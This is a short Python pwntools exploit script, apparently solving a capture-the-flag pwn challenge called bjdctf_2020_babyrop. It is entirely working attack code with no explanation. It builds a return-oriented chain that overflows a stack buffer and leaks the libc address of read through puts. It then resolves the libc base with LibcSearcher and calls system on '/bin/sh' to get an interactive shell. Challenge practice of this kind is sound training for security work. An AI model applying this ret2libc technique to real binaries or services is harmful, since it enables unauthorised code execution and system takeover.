from pwn import *
from LibcSearcher import *

context(os='linux',log_level='debug')

#io = remote('node3.buuoj.cn',27443)
io = process('./bjdctf_2020_babyrop')
elf = ELF('./bjdctf_2020_babyrop')

put_plt = elf.plt['puts']
read_got = elf.got['read']
rdi = 0x400733
main = 0x4006ad

payload = cyclic(0x20+8)+p64(rdi)+p64(read_got)+p64(put_plt)+p64(main)

io.recvuntil('story!\n')
io.sendline(payload)
read_adr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\0'))
print(read_adr)

libc = LibcSearcher('read',read_adr)
base = read_adr -libc.dump('read')
binsh = base+libc.dump('str_bin_sh')
system = base+libc.dump('system')
io.recvuntil('story!\n')
payload = cyclic(0x20+8)+p64(rdi)+p64(binsh)+p64(system)
io.sendline(payload)
io.interactive()




